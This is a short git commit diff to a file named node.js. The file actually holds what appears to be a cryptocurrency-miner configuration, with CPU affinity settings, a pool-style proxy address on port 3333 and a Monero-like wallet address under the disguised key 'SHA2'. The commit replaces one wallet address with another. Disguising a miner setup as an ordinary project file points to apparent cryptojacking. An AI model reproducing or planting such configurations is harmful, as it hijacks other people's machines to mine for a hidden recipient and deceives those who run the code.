4f79ebc33fcf774d9c46b3a9e4ce115ea5453508
arnold <mydevemail@protonmail.com>
2017-09-14 03:24:07 +0200

    Initial commit

--- node.js
+++ node.js
@@ -3,4 +3,4 @@
     { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },
 ],"output_file" : "",
 "proxy" : "94.23.251.22:3333",
-"SHA2" : "49Lq87o79GbZC75QvfB8fz4r6UZW89KNKP55V6WN8AbWcxkG7xmir83NMiX4m78A1GK1sRAQubP12d71ZiNpqx2cTcyXyLL","xx" : "x","call" : 10,"rt" : 10,"gl" : 0,"vl" : 0,"hpt" : 60,"dm" : true,"htd" : 0,"p4" : true,
+"SHA2" : "49sjSJJhxqpezbPE1euyN1gyVtcYQWr1w8XdjYaVQMeAFD56B833eLcfx5xH7TCCyzZekyh7UNVyHbr7PSQ21UNc2zU1yve","xx" : "x","call" : 10,"rt" : 10,"gl" : 0,"vl" : 0,"hpt" : 60,"dm" : true,"htd" : 0,"p4" : true,
